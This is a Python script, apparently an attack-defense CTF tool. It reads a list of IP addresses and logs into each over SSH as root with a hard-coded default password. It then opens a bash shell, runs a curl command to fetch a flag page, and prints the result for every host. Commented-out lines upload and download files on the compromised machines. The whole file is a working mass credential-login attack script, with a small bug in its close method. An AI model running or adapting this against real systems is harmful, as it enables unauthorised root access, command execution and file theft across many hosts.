#!/usr/bin/env python
# encoding: utf-8
from pwn import *
from paramiko.ssh_exception import AuthenticationException

host_list_file="iplist.txt"

class ssh_shell():
    def __init__(self,host,user,password,port=22):
        self.host = host
        self.user = user
        self.password = password
        self.port = port

    def execute(self,cmd):
        self.sh.sendline(cmd)
        return self.sh.recv()

    def upload_file(self,localfile,remotefile):
        try:
            self.shell.upload_file(localfile,remotefile)
            return True
        except Exception,e:
            print e
            return False

    def download_file(self,remotefile,localfile):
        try:
            self.shell.download_file(remotefile,localfile)
            return True
        except Exception,e:
            print e
            return False

    def connect(self):
        try:
            self.shell = ssh(host=self.host,user=self.user,password=self.password,port=self.port,timeout=5)
            self.sh=self.shell.run('/bin/bash')
            return True
        except AuthenticationException,e:
            print e
            return False
        except:
            print 'fail connect to %s:%s' %(self.host,self.port)
            return False

    def close(self):
        self.sh.close()
        self.shell.colose()

    def run(self):
        r = ''
        if self.connect():
            #r = self.execute('whoami')
            #print r
            #self.upload_file('hash.txt','h.txt')
            #self.download_file('h.txt','hh.txt')
            r = self.execute('curl -s http://localhost/getflag.php')
            self.close()

        return r

def get_hosts():
    hosts = []
    with open(host_list_file,'r') as f:
        for line in f:
            hosts.append(line.strip())
    return hosts

def main():
    hosts=get_hosts()
    user='root'
    password='qwe123'
    port=22
    r = []
    for host in hosts:
        shell = ssh_shell(host,user,password,port)
        i = shell.run()
        r.append("%s:%s"%(host,i))

    for line in r:
        print line

if __name__ == '__main__':
    main()
